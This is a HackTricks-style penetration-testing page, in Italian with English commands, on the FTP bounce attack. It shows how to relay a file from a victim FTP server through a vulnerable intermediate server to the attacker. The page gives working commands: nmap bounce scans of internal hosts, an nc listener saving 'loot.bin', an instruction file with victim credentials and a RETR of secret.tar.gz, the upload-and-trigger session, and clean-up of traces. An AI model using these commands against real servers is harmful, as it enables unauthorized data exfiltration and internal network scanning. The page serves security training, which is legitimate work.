# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Riassunto

Se hai accesso a un **bounce FTP server**, puoi far sì che richieda file da **un altro server FTP** (dove conosci alcune credenziali) e scaricare quel file sul **tuo server**.

## Requisiti

- Credenziali FTP valide nel **server FTP intermedio**
- Credenziali FTP valide nel **server FTP vittima**
- Entrambi i server **accettano il comando `PORT`** (bounce FTP attack)
- Puoi **scrivere** in qualche directory del **server FTP intermedio**
- Il server intermedio ha **più accesso** all'interno del server FTP vittima rispetto a te

## Passaggi

1. Connettiti al **tuo server FTP** e metti la connessione in modalità passiva (`pasv` command) in modo che **ascolti** in una directory dove il servizio vittima invierà il file.
2. Crea il file che il server FTP intermedio invierà al server vittima (lo **exploit script**). Questo file sarà in testo semplice con i comandi necessari per autenticarsi sul server vittima, cambiare directory e scaricare un file sul tuo server.
3. Connettiti al **server FTP intermedio** e carica il file precedente.
4. Fai in modo che il server FTP intermedio **stabilisca una connessione** con il server vittima e invii il file exploit.
5. **Cattura** il file nel tuo server FTP.
6. **Elimina** il file exploit dal server FTP intermedio.

## Verifica rapida per bounce hosts vulnerabili

- **Nmap** supporta ancora i controlli FTP bounce. Esempio per verificare un potenziale server intermedio:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Se il server rifiuta valori `PORT` di terze parti la scansione fallirà; alcuni dispositivi embedded/legacy, NAS e daemon FTP di appliance lo consentono ancora.

## Automatizzare il secondo download FTP

Di seguito un modo modernizzato per prelevare un file attraverso un server FTP intermedio vulnerabile.

1. **Open a passive listener** on your attack box (any TCP sink works):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Note** your IP as `A,B,C,D` and port `P` as `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Build the instruction file** that the middle server will replay to the victim:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Upload & trigger from the middle server** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Grab the file** from your listener (`loot.bin`).
6. **Clean up** the uploaded `instrs` file on the middle server.

Note:
- Il padding (`dd ...`) impedisce che la connessione di controllo si chiuda prima che il RETR termini (problema della large TCP window discusso in writeup classici).
- Any service that can **listen and dump TCP** can replace the FTP PASV socket (e.g., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Se il server intermedio limita le porte privilegiate, usa una porta alta in `PORT` e regola di conseguenza il tuo listener.

## Trucchi extra

- Usa un FTP server bounceable per **port-scan internal hosts** quando il file relay è bloccato:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Alcuni WAF/IDS moderni (es. Juniper IPS) includono signature specifiche per **FTP:EXPLOIT:BOUNCE-ATTACK**; payload rumorosi o padding mancante possono attivarli.
- Quando il server intermedio impone restrizioni "PORT to same host", posiziona il tuo **listener on the middle server itself** (se hai permessi di scrittura/esecuzione) e inoltra il file catturato in seguito.

Per una guida old-school più dettagliata consulta: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## Riferimenti

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
